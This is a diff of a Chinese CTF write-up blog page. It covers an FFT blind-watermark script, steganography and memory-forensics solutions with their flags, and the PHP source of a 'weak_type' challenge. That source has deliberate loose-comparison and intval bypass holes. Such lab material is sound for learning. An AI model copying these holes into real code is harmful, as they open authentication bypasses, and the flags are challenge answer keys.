&lt;float&gt; for --alpha&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        alpha = <span class="built_in">float</span>(sys.argv[p+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Missing arg...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    fn1 = sys.argv[<span class="number">2</span>]</span><br><span class="line">    fn2 = sys.argv[<span class="number">3</span>]</span><br><span class="line">    fn3 = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenCV是以(BGR)的顺序存储图像数据的</span></span><br><span class="line"><span class="comment"># 而Matplotlib是以(RGB)的顺序显示图像的</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bgr_to_rgb</span>(<span class="params">img</span>):</span></span><br><span class="line">    b, g, r = cv2.split(img)</span><br><span class="line">    <span class="keyword">return</span> cv2.merge([r, g, b])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cmd == <span class="string">&#x27;encode&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;image&lt;%s&gt; + watermark&lt;%s&gt; -&gt; image(encoded)&lt;%s&gt;&#x27;</span> % (fn1, fn2, fn3))</span><br><span class="line">    img = cv2.imread(fn1)</span><br><span class="line">    wm = cv2.imread(fn2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print img.shape # 高, 宽, 通道</span></span><br><span class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</span><br><span class="line">    hwm = np.zeros((<span class="built_in">int</span>(h * <span class="number">0.5</span>), w, img.shape[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">0</span>] &gt; wm.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">1</span>] &gt; wm.shape[<span class="number">1</span>]</span><br><span class="line">    hwm2 = np.copy(hwm)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(wm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(wm.shape[<span class="number">1</span>]):</span><br><span class="line">            hwm2[i][j] = wm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldseed: random.seed(seed,version=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: random.seed(seed)</span><br><span class="line">    m, n = <span class="built_in">list</span>(<span class="built_in">range</span>(hwm.shape[<span class="number">0</span>])), <span class="built_in">list</span>(<span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> oldseed:</span><br><span class="line">        random.shuffle(m,random=random.random)</span><br><span class="line">        random.shuffle(n,random=random.random)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random.shuffle(m)</span><br><span class="line">        random.shuffle(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]):</span><br><span class="line">            hwm[i][j] = hwm2[m[i]][n[j]]</span><br><span class="line"></span><br><span class="line">    rwm = np.zeros(img.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]):</span><br><span class="line">            rwm[i][j] = hwm[i][j]</span><br><span class="line">            rwm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = hwm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(rwm)), \</span><br><span class="line">            plt.title(<span class="string">&#x27;encrypted(watermark)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    f1 = np.fft.fft2(img)</span><br><span class="line">    f2 = f1 + alpha * rwm</span><br><span class="line">    _img = np.fft.ifft2(f2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    img_wm = np.real(_img)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, img_wm, [<span class="built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里计算下保存前后的(溢出)误差</span></span><br><span class="line">    img_wm2 = cv2.imread(fn3)</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">2</span>]):</span><br><span class="line">                <span class="built_in">sum</span> += np.power(img_wm[i][j][k] - img_wm2[i][j][k], <span class="number">2</span>)</span><br><span class="line">    miss = np.sqrt(<span class="built_in">sum</span>) / (img_wm.shape[<span class="number">0</span>] * img_wm.shape[<span class="number">1</span>] * img_wm.shape[<span class="number">2</span>]) * <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;Miss %s%% in save&#x27;</span> % miss)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;image(encoded)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    f2 = np.fft.fft2(img_wm)</span><br><span class="line">    rwm = (f2 - f1) / alpha</span><br><span class="line">    rwm = np.real(rwm)</span><br><span class="line"></span><br><span class="line">    wm = np.zeros(rwm.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">assert</span> cv2.imwrite(<span class="string">&#x27;_bwm.debug.wm.jpg&#x27;</span>, wm)</span><br><span class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> cmd == <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;image&lt;%s&gt; + image(encoded)&lt;%s&gt; -&gt; watermark&lt;%s&gt;&#x27;</span> % (fn1, fn2, fn3))</span><br><span class="line">    img = cv2.imread(fn1)</span><br><span class="line">    img_wm = cv2.imread(fn2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(img_wm)), plt.title(<span class="string">&#x27;image(encoded)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldseed: random.seed(seed,version=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: random.seed(seed)</span><br><span class="line">    m, n = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">int</span>(img.shape[<span class="number">0</span>] * <span class="number">0.5</span>))), <span class="built_in">list</span>(<span class="built_in">range</span>(img.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> oldseed:</span><br><span class="line">        random.shuffle(m,random=random.random)</span><br><span class="line">        random.shuffle(n,random=random.random)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random.shuffle(m)</span><br><span class="line">        random.shuffle(n)</span><br><span class="line"></span><br><span class="line">    f1 = np.fft.fft2(img)</span><br><span class="line">    f2 = np.fft.fft2(img_wm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image(encoded))&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    rwm = (f2 - f1) / alpha</span><br><span class="line">    rwm = np.real(rwm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(rwm)), \</span><br><span class="line">            plt.title(<span class="string">&#x27;encrypted(watermark)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    wm = np.zeros(rwm.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</span><br><span class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, wm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214323874.png" alt="image-20201201214323874"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214323874.png" alt="image-20201201214323874" title="">
+                </div>
+                <div class="image-caption">image-20201201214323874</div>
+            </figure>
+
 <p>大小较大的那张作为有水印的图片</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214552082.png" alt="image-20201201214552082"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214552082.png" alt="image-20201201214552082" title="">
+                </div>
+                <div class="image-caption">image-20201201214552082</div>
+            </figure>
+
 <p>hint里面还有一个是Manchester coding（曼彻斯特编码）</p>
 <p><a target="_blank" rel="noopener" href="https://dl.pconline.com.cn/download/2588965.html">曼彻斯特编码解码器下载_曼彻斯特编码解码器官方下载-太平洋下载中心 (pconline.com.cn)</a></p>
 <p>把图片左上角或右下角的都输入工具的第一个输入框中（十六进制），按照1-2-3的顺序点击按钮，得到的十六进制转ASCII</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201230355729.png" alt="image-20201201230355729"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201230355729.png" alt="image-20201201230355729" title="">
+                </div>
+                <div class="image-caption">image-20201201230355729</div>
+            </figure>
+
 <p>266C61677B61623164655F62795F7468335F6C61777D</p>
 <p>&amp;lag{ab1de_by_th3_law}</p>
 <p>flag{ab1de_by_th3_law}</p>
-<h4 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193607663.png" alt="image-20201128193607663"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193633813.png" alt="image-20201128193633813"></p>
+<h4 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193607663.png" alt="image-20201128193607663" title="">
+                </div>
+                <div class="image-caption">image-20201128193607663</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193633813.png" alt="image-20201128193633813" title="">
+                </div>
+                <div class="image-caption">image-20201128193633813</div>
+            </figure>
+
 <p>Ook编码，把¿ ¡改成? !，空格改成Ook</p>
 <p>[Brainfuck/Ook! Obfuscation/Encoding <a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128194118981.png" alt="image-20201128194118981"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128194118981.png" alt="image-20201128194118981" title="">
+                </div>
+                <div class="image-caption">image-20201128194118981</div>
+            </figure>
+
 <p>flag{y0u_ar3_clev3r}</p>
 <h4 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h4><p>[BUUCTF：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109882441">UTCTF2020]sstv_末初-CSDN博客</a></p>
 <p>类似做法，直接照着来就可以</p>
 <p>QSSTV</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128194330674.png" alt="image-20201128194330674"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128194330674.png" alt="image-20201128194330674" title="">
+                </div>
+                <div class="image-caption">image-20201128194330674</div>
+            </figure>
+
 <p>DMCTF{SSTV,yyds?}</p>
 <h4 id="最简单的内存取证"><a href="#最简单的内存取证" class="headerlink" title="最简单的内存取证"></a>最简单的内存取证</h4><p>用volatility来做</p>
 <p>首先识别系统</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128195851478.png" alt="image-20201128195851478"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128195851478.png" alt="image-20201128195851478" title="">
+                </div>
+                <div class="image-caption">image-20201128195851478</div>
+            </figure>
+
 <p>扫描进程，看看有什么</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128200303919.png" alt="image-20201128200303919"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128200303919.png" alt="image-20201128200303919" title="">
+                </div>
+                <div class="image-caption">image-20201128200303919</div>
+            </figure>
+
 <p>看不出什么东西，太菜了。。。</p>
 <p>扫描文件</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128200456659.png" alt="image-20201128200456659"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128200456659.png" alt="image-20201128200456659" title="">
+                </div>
+                <div class="image-caption">image-20201128200456659</div>
+            </figure>
+
 <p>有个flag.txt，提取出来</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202742202.png" alt="image-20201128202742202"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202805990.png" alt="image-20201128202805990"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202742202.png" alt="image-20201128202742202" title="">
+                </div>
+                <div class="image-caption">image-20201128202742202</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202805990.png" alt="image-20201128202805990" title="">
+                </div>
+                <div class="image-caption">image-20201128202805990</div>
+            </figure>
+
 <p>89504E47是PNG的文件头，用WinHex保存下来。</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202949377.png" alt="image-20201128202949377"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202949377.png" alt="image-20201128202949377" title="">
+                </div>
+                <div class="image-caption">image-20201128202949377</div>
+            </figure>
+
 <p>是张缺了定位码的二维码，补全。</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128203423490.png" alt="image-20201128203423490"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128203423490.png" alt="image-20201128203423490" title="">
+                </div>
+                <div class="image-caption">image-20201128203423490</div>
+            </figure>
+
 <p>DMCTF{Mem0ry_FoRensics+i5-vErY_1ntere5t1nG}</p>
 <h4 id="SimpleQrcode"><a href="#SimpleQrcode" class="headerlink" title="SimpleQrcode"></a>SimpleQrcode</h4><p>gif，StegSolve分离</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128204338956.png" alt="image-20201128204338956"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128204257324.png" alt="image-20201128204257324"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128204338956.png" alt="image-20201128204338956" title="">
+                </div>
+                <div class="image-caption">image-20201128204338956</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128204257324.png" alt="image-20201128204257324" title="">
+                </div>
+                <div class="image-caption">image-20201128204257324</div>
+            </figure>
+
 <p>一张张扫，手动做法。</p>
 <p>DMCTF{QrCode_1s_so_interesting!!!}</p>
 <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="weak-type"><a href="#weak-type" class="headerlink" title="weak_type"></a>weak_type</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//level1 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;202020020&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">202020020</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; level 1 Ok &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what are you doing?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; md5(<span class="variable">$v1</span>)==md5(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; level 2 Ok &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Are you kidding me ?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; Wow you got it !!! &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">Warning: <span class="keyword">include</span>(<span class="keyword">class</span>.php): failed to open stream: No such file <span class="keyword">or</span> <span class="built_in">directory</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">4</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">include</span>(): Failed opening <span class="string">&#x27;class.php&#x27;</span> <span class="keyword">for</span> inclusion (include_path=<span class="string">&#x27;.:/usr/local/lib/php&#x27;</span>) in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>代码审计</p>
 <p>总共三个level</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128210929160.png" alt="image-20201128210929160"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211013711.png" alt="image-20201128211013711"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211142021.png" alt="image-20201128211142021"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128210929160.png" alt="image-20201128210929160" title="">
+                </div>
+                <div class="image-caption">image-20201128210929160</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211013711.png" alt="image-20201128211013711" title="">
+                </div>
+                <div class="image-caption">image-20201128211013711</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211142021.png" alt="image-20201128211142021" title="">
+                </div>
+                <div class="image-caption">image-20201128211142021</div>
+            </figure>
+
 <p>dmctf{80636ab6-aa36-4b73-8e92-c8bbeb2d1e1c}</p>
-<h4 id="fungame"><a href="#fungame" class="headerlink" title="fungame"></a>fungame</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211344457.png" alt="image-20201128211344457"></p>
